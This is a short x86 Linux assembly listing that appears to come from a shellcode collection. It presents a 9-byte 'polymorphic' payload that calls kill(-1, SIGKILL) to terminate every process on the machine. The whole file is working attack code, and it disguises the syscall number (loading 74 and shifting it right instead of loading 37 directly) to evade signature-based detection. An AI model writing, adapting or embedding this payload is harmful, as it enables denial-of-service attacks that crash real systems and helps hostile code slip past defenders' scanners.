; linux/x86 kill all processes 9 bytes
; polymorphic variant, original version made byroot@thegibson
; 2010-01-14
 
section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        
	mov cl, 9

	;mov al, 37
        mov al, 74
	shr al, 1	

	;push byte -1
        ;pop ebx
        sub ebx, ebx
	sub ebx, 1

        int 0x80
